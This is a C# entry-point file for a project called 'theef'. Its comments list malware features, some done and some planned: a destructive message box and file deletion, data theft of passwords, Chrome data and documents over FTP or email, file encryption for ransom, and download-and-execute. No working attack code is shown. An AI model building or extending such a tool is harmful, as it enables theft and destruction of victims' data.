using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace theef
{
    class Program
    {
        static void Main(string[] args)
        {
            /* Theef feature:
             * DONE - Message Box
             * - Blue screen
             * - Quick Auto Remote Backup (Passwords, Chrome, Documents, Pictures)
             *      - "Smart" backup, checks file types/size to ensure files are not too big
             *      - FTP
             *      - Email
             * DONE - File delete
             * - File encryptor/decryptor (documents, pictures, ...)
             *      - Store private key somewhere safe.
             * - Download and execute/open file(s)
             */

            // TODO: bellow
            /*
             *  - Multi threading
             *  - Module based features
             *  - Frontend for making the config file.
             *  - Change config format so it is not terrible. Json?
             *  - Change config format so if you don't want something enabled you just don't include it.
             */

            // Load the parts array into the settings class.
            Settings settings = new Settings(Properties.Resources.Settings.Split(':'));

            // Run the operations.
            new Runner(settings);
        }
    }
}
